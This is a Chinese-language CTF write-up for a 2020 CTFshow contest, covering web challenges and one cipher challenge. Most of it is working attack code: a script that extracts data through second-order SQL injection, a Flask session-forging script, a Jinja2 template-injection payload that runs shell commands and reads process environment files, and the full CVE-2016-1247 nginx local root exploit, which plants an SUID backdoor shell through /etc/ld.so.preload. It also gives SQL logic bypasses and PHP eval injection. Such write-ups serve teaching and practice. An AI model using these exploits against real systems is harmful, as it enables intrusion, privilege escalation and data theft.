---
title: CTFshow内部赛_WP
date: 2020-03-29
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---

# CTFshow内部赛_WP

## Web

### Web1

#### 分析

```
www.zip源码泄露,代码审计,register.php中的黑名单限制较少,分析可得注册的用户名写入seesion,然后直接用session中的用户名待入查询,与2018网鼎杯Unfinish差不多,详情搜索
```

<!-- more -->

#### exp

```
import requests
import re,binascii
login_url = "https://eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show/login.php"
register_url = "https://eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show/register.php"
s=requests.session()
users_email = ["test" + str(i) + "@qq.com" for i in range(0,17)]
def register(user_email,offset,s):
    reg_datas = {
        "e" : user_email,
        #"username" : "0'+(select substr(hex(hex((select * from flag))) from " + str(1+offset*10)+ " for 10))+'0",
        # "username":"test",
        "u":"0'+(select/**/substr(hex(hex((select/**/*/**/from/**/flag)))/**/from/**/" + str(1+offset*10)+ "/**/for/**/10))+'0",
        "p":"test"
    }
    # print(reg_datas['username'])
    r = s.post(url = register_url,data = reg_datas,allow_redirects=True)
    # print(r.request.body)
    # print(r.status_code)
    return r
def login(user_email,s):
    login_data={
        "e":user_email,
        "p":"test"
    }
    r = s.post(url=login_url, data=login_data, allow_redirects=True)
    pattern = 'Hello\s*(\S*),'
    return re.findall(pattern,r.text)[0]
if __name__ == '__main__':
    flag_double_hex = ''
# email="test@mail.com"
# offset=1
    for email,offset in zip(users_email,range(0,len(users_email))):
        print(email,offset)
        r=register(email,offset,s)
        test = login(email,s)
        print(test)
        flag_double_hex += test
        print("[+] " + flag_double_hex)
    print("flag: " + binascii.a2b_hex(binascii.a2b_hex(flag_double_hex)).decode())
```

### Web2

#### 分析

查看页面源代码有提示,`param:ctfshow key:ican`

图片是css都在static文件夹下,没有index.php等等,

随便登录发现要admin,查看cookies,发现是session,想到flask

开始伪造admin的session

#### 伪造脚本

```
# # coding:utf-8
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import hashlib
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation="hmac",
			digest_method=hashlib.sha1
		)
		return URLSafeTimedSerializer(secret_key, salt="cookie-session",
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
    sk = "ican"
    sessionDict = {"username":"admin"}
    cookie = encodeFlaskCookie(sk, sessionDict)
    #decodedDict = decodeFlaskCookie(sk, session)
    print(cookie)
```

替换test的sesion刷新页面发现缺少参数,添加ctfshow

#### fuzz

```
ctfshow=1
#页面显示1
ctfshow={{1*2}}
#页面显示2
```

可知是SSTI

#### payload

```
?ctfshow={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /proc/1/environ').read()") }}{% endif %}{% endfor %}
```

ps -aux发现执行了/flag.sh,但是根目录下面没有,读取proc下面的一些文件试试,得到flag

### Web3

#### 分析

题目图片中有cai字样

蚁剑连接,密码是cai

flag在/下面,但是没有权限

终端运行ps -aux

得到cron,cron是linux的定时任务,cat /etc/crontab文件得到最下面一行的nginx的日志切片程序,一步步查看文件深入到/var/log目录下,ls -af,得到error.log是root权限,搜一搜得到nginx错误配置error.log root权限的提权漏洞

#### poc

```
#!/bin/bash
#
# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.0)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
# etc.) to escalate their privileges from nginx web server user (www-data) to root 
# through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#
# http://www.debian.cn/
#
BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"
function cleanexit {
# Cleanup 
echo -e "\n[+] Cleaning up..."
rm -f $PRIVESCSRC
rm -f $PRIVESCLIB
rm -f $ERRORLOG
touch $ERRORLOG
if [ -f /etc/ld.so.preload ]; then
echo -n > /etc/ld.so.preload
fi
echo -e "\n[+] Job done. Exiting with code $1 \n"
exit $1
}
function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
cleanexit 0
}
#intro 
cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_
echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"
# Args
if [ $# -lt 1 ]; then
echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
exit 3
fi
# Priv check
echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
exit 3
fi
# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
exit 3
fi
# [ Exploitation ]
trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>
uid_t geteuid(void) {
static uid_t  (*old_geteuid)();
old_geteuid = dlsym(RTLD_NEXT, "geteuid");
if ( old_geteuid() == 0 ) {
chown("$BACKDOORPATH", 0, 0);
chmod("$BACKDOORPATH", 04777);
unlink("/etc/ld.so.preload");
}
return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
cleanexit 2;
fi
# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"
# Safety check
if [ -f /etc/ld.so.preload ]; then
echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
exit 2
fi
# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"
# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
sleep 1
if [ -f /etc/ld.so.preload ]; then
echo $PRIVESCLIB > /etc/ld.so.preload
rm -f $ERRORLOG
break;
fi
done
# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload
# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null
# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
echo -e "\n[!] Failed to get root"
cleanexit 2
fi
rm -f $ERRORLOG
echo > $ERRORLOG
  
# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"
# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i
# Job done.
cleanexit 0：Debian、ubuntu发行版的Nginx本地提权漏洞（含POC）
```

将poc上传到/var/www/html/目录下面,更改777权限,更改文件名为poc.sh

在蚁剑的终端中用bash反弹一个shell到vps,然后在vps执行一下命令,等待cron定时任务执行,触发漏洞得到root权限

```
cd /var/www/html/
./poc.sh /var/log/nginx/error.log
cat /flag
```

### Web5

#### 分析

fuzz一下只能5个字符,or and =不能用

但是&& || <>可以,只能五个字符,便思考逻辑

```
--猜测后台sql
select * from table where username='' and password=''
--构造逻辑
select * from table where username='1'<'2' and password='1'<'2'
```

#### payload

```
u=1'<'2&p=1'<'2
```

### Web6

#### 分析

eval以分号作为语句分隔符,直接结束前面一段代码另起炉灶

#### payload

```
a;phpinfo();
a;system('cat /var/falg.txt')
```

flag找一找在var下面

## 密码

### 密码2

下载得到文件,ctf替换`.`show替换`-`morse解码在得到了FLAG四个字

然后后面都是四个16进制码一组,utf-8解码得到flag